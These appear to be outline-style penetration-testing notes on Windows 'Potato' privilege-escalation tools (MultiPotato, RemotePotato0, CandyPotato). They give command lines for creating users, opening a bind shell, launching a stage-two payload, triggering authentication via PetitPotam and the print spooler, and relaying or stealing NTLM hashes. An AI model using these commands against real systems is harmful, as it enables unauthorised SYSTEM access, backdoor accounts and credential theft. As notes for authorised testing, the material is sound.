		* MultiPotato -<br />[https://github.com/S3cur3Th1sSh1t/MultiPotato](https://github.com/S3cur3Th1sSh1t/MultiPotato)
			* Overview
				* Improvements over RoguePotato
					* It doesn't contain any SYSTEM auth trigger for weaponization. Instead the code can be used to integrate your favorite trigger by yourself.
					* It's not only using CreateProcessWithTokenW to spawn a new process. Instead you can choose between CreateProcessWithTokenW, CreateProcessAsUserW, CreateUser and BindShell.
			* Examples
				* CreateUser with modified PetitPotam trigger

						c:\temp\MultiPotato> MultiPotato.exe -t CreateUser
					* You have by default value 60 secconds (changable via THEAD_TIMEOUT) to let the SYSTEM account or any other account authenticate. This can be done for example via an unpatched MS-EFSRPC function. By default MultiPotato listens on the pipename \\.\pipe\pwned/pipe/srvsvc which is meant to be used in combination with MS-EFSRPC. For other SYSTEM auth triggers you can adjust this value via the -p parameter.

							c:\temp\MultiPotato> PetitPotamModified.exe localhost/pipe/pwned localhost
					* Using PetitPotam.py as trigger from a remote system with a valid low privileged user is of course also possible.
				* CreateProcessAsUserW with SpoolSample trigger:

					c:\temp\MultiPotato> MultiPotato.exe -t CreateProcessAsUserW -p "pwned\pipe\spoolss" -e "C:\temp\stage2.exe"
				* And trigger it via

						c:\temp\MultiPotato>MS-RPRN.exe \\192.168.100.150 \\192.168.100.150/pipe/pwned
				* Important: In my testings for MS-RPRN I could not use localhost or 127.0.0.1 as target, this has to be the network IP-Adress or FQDN. In addition the Printer Service needs to be enabled for this to work.

					    BindShell with SpoolSample PipeName

						c:\temp\MultiPotato> MultiPotato.exe -t BindShell -p "pwned\pipe\spoolss"
		* RemotePotato0 -<br >[https://github.com/antonioCoco/RemotePotato0](https://github.com/antonioCoco/RemotePotato0)
			* Overview
				* DCOM Activation Service
				* [CLSID List Guide](Testaments_and_Books/Redvelations/)
				* "It abuses the DCOM activation service and trigger an NTLM authentication of any user currently logged on in the target machine. It is required that a privileged user is logged on the same machine (e.g. a Domain Admin user). Once the NTLM type1 is triggered we setup a cross protocol relay server that receive the privileged type1 message and relay it to a third resource by unpacking the RPC protocol and packing the authentication over HTTP. On the receiving end you can setup a further relay node (eg. ntlmrelayx) or relay directly to a privileged resource. RemotePotato0 also allows to grab and steal NTLMv2 hashes of every users logged on a machine."
				* Why: I recently had a penetrationtest, where I was able to pwn a MSSQL Server via SQL-Injection and XP_CMDShell. But all public Potatoes failed on this target system to elevate privileges from service-account to SYSTEM. The System auth trigger was not the problem - instead CreateProcessWithTokenW failed all the time with NTSTATUS Code 5 - access forbidden. This didn't really makes sense for me and may be an edge case. One reason for that could be the local endpoint protection which may have blocked the process creation after impersonating SYSTEM.
				* Therefore I searched for alternatives - and asked some people on Twitter about it. Again Credit to @splinter_code for explaining me how to do it via CreateProcessAsUserW which worked fine on the pwned MSSQL server to get a SYSTEM C2-Callback.

	* Candy Potato ("Caramelized Juicy Potato")
		* References
		* Overview
			* "Version 0.2 of JuicyPotato. In comparison with version 0.1 (JuicyPotato), this version offers some improvements, such as automating the exploitation."
			* "This tool has been made on top of the original JuicyPotato, with the main focus on improving/adding some functionalities which was lacking. It is known to work against both Windows Workstation and Server versions up to 8.1 and Server 2016, respectively."
			* JuicyPotato leverages the privilege escalation chain based on certain COM Servers, using a MiTM listener hosted on 127.0.0.1, and it works when you have SeImpersonate or SeAssignPrimaryToken privileges. By default, JuicyPotato uses the BITS service CLSID, and provides other tools (a set of PowerShell and Batch scripts), to enumerate and test other CLSIDs.
			* JuicyPotato Drawbacks
				* Upload Multiple executables
				* Create Multiple data files during CLSID gathering
				* Low speed because of multistep process
				* The "weakest" point is that different Windows Versions, as well as different configurations often requires to enumerate available CLSID over the target machine and that "try" them, one by one.
		* Example

				T:\>CandyPotato.exe
				CandyPotato v0.2
		* Parameters
			* Mandatory args
				* `-t` createprocess call: `<t>` CreateProcessWithTokenW, `<u>` CreateProcessAsUser, `<*>` try both
				* `-p` `<program>`: program to launch
			* Optional args
				* `-l` - `<port>`: COM server listen port (default 10000)
				* `-m` - `<ip>`: COM server listen address (default 127.0.0.1)
				* `-a` -` <argument>`: command line argument to pass to program (default NULL)
				* `-k` - `<ip>`: RPC server ip address (default 127.0.0.1)
				* `-n` - `<port>`: RPC server listen port (default 135)
				* `-c` - <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
				* `-z` - only test CLSID and print token's user
				* `-x` - automatically identifies suitable CLSIDs and attempt exploitation
				* `-s` - `<start-type>` `[1-4](default 3:[MANUAL])`
				* `-Q` - print available CLSIDs and exit
